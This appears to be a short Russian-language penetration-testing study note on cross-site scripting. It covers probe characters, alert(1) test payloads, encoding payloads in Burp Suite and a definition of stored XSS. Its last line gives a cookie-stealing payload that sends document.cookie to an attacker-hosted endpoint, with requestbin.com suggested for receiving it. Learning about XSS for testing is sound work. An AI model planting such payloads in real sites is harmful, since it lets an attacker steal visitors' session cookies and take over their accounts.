База знаний: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
Проверять можно путем внедрения символов: `"`, `>`
Примеры: `<script>alert(1)</script>`,`<img src=x onerror=alert(1) />` (ошибка срабатывает, так как неправильная ссылка на изображение).
Полезную нагрузку HTML можно закодировать с помощью Burp Suite Decoder (Encode as HTML).
## Хранимый XSS
Возникает, когда приложение получает данные из недоверенного источника и включает эти данные в свои последующие HTTP-ответы. JS-скрипт будет выполнен у других пользователей сайта.
Для хостинга домена с целью получения запросов с данными пользователя сайта можно использовать https://requestbin.com/: `<img src=x onerror=fetch('<domain>/?' + document.cookie) />`